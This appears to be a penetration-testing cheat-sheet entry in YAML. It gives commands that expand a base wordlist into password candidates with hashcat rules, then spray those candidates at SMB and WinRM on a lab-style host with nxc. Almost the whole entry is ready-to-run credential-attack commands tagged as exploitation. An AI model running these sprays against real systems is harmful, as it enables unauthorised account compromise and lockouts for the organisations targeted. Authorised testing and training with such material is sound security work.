---
description: |
  Generate password lists using Hashcat rules from a base wordlist, then spray against services. Use dive.rule for thorough coverage or best64.rule for speed. Useful for targeted password attacks when you know base words.
command: |
  # Generate passwords from base wordlist (raw.txt = company names, usernames, seasons, years)
  hashcat raw.txt --stdout -r /usr/share/hashcat/rules/best64.rule > rawpass.txt
  hashcat raw.txt --stdout -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule > rawpass.txt
  hashcat raw.txt --stdout -r /usr/share/hashcat/rules/dive.rule > rawpass.txt

  # Dedup
  sort -u rawpass.txt -o rawpass.txt

  # Spray
  nxc smb 10.10.10.27 -u sec_user -p rawpass.txt
  nxc smb 10.10.10.27 -u users.txt -p rawpass.txt --continue-on-success
  nxc winrm 10.10.10.27 -u sec_user -p rawpass.txt
items:
  - Username
phase:
  - Exploitation
target_os: []
services: []
techniques:
  - Password_Spraying
references:
  - https://hashcat.net/wiki/doku.php?id=rule_based_attack
---
